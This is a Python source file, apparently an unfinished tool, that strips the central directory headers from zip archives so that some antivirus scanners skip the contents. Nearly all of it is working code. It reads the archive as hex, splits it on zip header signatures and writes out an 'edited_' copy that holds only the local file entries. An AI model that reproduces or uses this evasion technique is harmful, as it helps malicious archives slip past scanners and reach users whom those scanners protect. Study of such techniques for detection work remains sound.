"""This implements an antivirus evasion technique for zip files
    
    By removeing the header for a file from the central directory some
    antivirus scanners skip a zipped file when scanning. When a zip file is
    processed with this tool it will automatically remove the central directory
    headers. The new file will have a prefix of edited_ attached to the file 
    name. 
"""
import argparse
import os
# from posixpath import split

from central_directory_header import CentralDirectoryHeader


# TODO update to only work on zip files
# TODO add to check for exceptions when writing to file
def read_in_file(file_loc):
    """Reads in the specified file and returns the hex

    Args:
        file_loc (str): The location of the zip file to read in

    Returns:
        str: The string representation of the hex of the file
    """
    with open(file_loc, 'rb') as f:
        file_hex = f.read().hex().lower()

    return file_hex


# TODO split on central dir magic num then split [0] on other header magic num for all the parts
# TODO add method to locate centrial directory and split it into the files that it contains

# TODO check format for return tuple in doc
def _split_zip_file_into_sections(file_hex):
    """Splits the zip file_hex into the central directory other headers

    Args:
        file_hex (str): The hex code of the file to split

    Returns:
        tuple: (local_files (srt): The local files section of the zip,
                central_directory (str): The central directory of the zip
                end_central_directory_header (str): The end central directory 
                    header)
    """
    split_end_central_directory_header = file_hex.split('504b0506', 1)
    if len(split_end_central_directory_header) == 2:
        end_central_directory_header = f'504b0506{split_end_central_directory_header[-1]}'
        # print(f'end_central_directory_header: {end_central_directory_header}')
    else:
        # TODO handle not a zip case
        print("not a zip file")
        return

    # TODO add central directory headers to the list
    split_central_directory_headers = split_end_central_directory_header[0].split(
        '504b0102', 1)
    central_directory = f'504b0102{split_central_directory_headers[-1]}'
    # for x in split_central_directory_headers[1:]:
    # print(f'central_directory_header: 504b0102{central_directory}')
    # central_directory_headers.append(
    # CentralDirectoryHeader(f'504b0102{x}'))

    # print(central_directory_headers)

    # split_local_file_header = split_central_directory_headers[0].split(
    # '504b0304')

    # TODO add stuff for local file header
    local_files = split_central_directory_headers[0]
    # for x in split_local_file_header[1:]:
    #   print(f'local_file_header: 504b0304{x}')

    #   print(file_hex.split("504b0102", 1))
    # central_directory = None
    # other_contents = None
    return (local_files, central_directory, end_central_directory_header)


def _create_new_file_path(file_loc):
    """Creates a new path to the new location of the edited zip file

    The new path is the same as the old with 
    'edited_' added in front of the old file name

    Args:
        file_loc (str): The path to the original file

    Returns:
        str: The path to the location of the new file
    """
    # splits the file path between the head and the file name
    # head_tail[0]: path to the file
    # head_tail[1]: the name of the file
    head_tail = os.path.split(file_loc)
    # TODO give option so specify new file name or prefix
    new_path = os.path.join(head_tail[0], f'edited_{head_tail[1]}')

    return new_path


def write_out_file(file_loc, contents):
    """Writes the edited file out to disk

    The location of the new file it the same as the old with an updated name

    Args:
        file_loc (str): The location of the original file
        contents (srt): What will be written to the new file
    """

    # TODO check for errors thrown from the file write
    new_file_path = _create_new_file_path(file_loc)
    with open(new_file_path, 'wb') as f:
        f.write(bytes.fromhex(contents))
    # TODO add return for any errors or success


def main(file_loc):
    """The main function for the program

    Args:
        file_loc (str): The location of the original zip file for the exploit
    """
    original_file_hex = read_in_file(file_loc)
    local_files, central_directory, end_central_directory = _split_zip_file_into_sections(
        original_file_hex)
    # print('\n\n\n')
    # print(local_files)
    # print(central_directory)
    # print(end_central_directory)
    write_out_file(file_loc=file_loc,
                   contents=f'{local_files}')


# TODO move this into another file
if __name__ == '__main__':
    # TODO update the description
    msg = "Test Description"

    parser = argparse.ArgumentParser(description=msg)

    parser.add_argument("-f", "--File", help="Zip File to edit")

    args = parser.parse_args()

    if args.File:
        main(file_loc=args.File)
